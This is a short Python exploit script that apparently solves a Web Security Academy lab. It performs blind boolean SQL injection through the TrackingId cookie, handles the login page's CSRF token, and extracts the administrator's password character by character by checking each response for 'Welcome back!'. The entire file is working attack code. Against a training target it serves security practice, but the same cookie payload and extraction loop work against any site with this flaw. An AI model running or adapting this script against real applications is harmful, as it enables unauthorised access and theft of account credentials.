import requests
import string
from bs4 import BeautifulSoup

arr = string.ascii_lowercase + string.digits


URL = 'https://0a120041042971078525a4c5005e00cb.web-security-academy.net/login'

session = requests.Session()

response = session.get(URL)
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})
if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)
csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")


count = 1
password = ''
while True:
    for i in arr:
        payload = f"T9V2C8UiA3XPk92b' AND (SELECT SUBSTRING(password,{count},1) FROM users WHERE username='administrator') = '" + i + "' --"
        cookies = {'TrackingId': payload}
        payload_2 = f"csrf={csrf_value}&username=a&password=a"
        response = session.post(URL, cookies=cookies, data=payload_2)
        if 'Welcome back!' in response.text:
            print(f'Passwordc found: {i}')
            password += i
            break
    count += 1
    if count > 20:
        break
print('Password found! ' + password)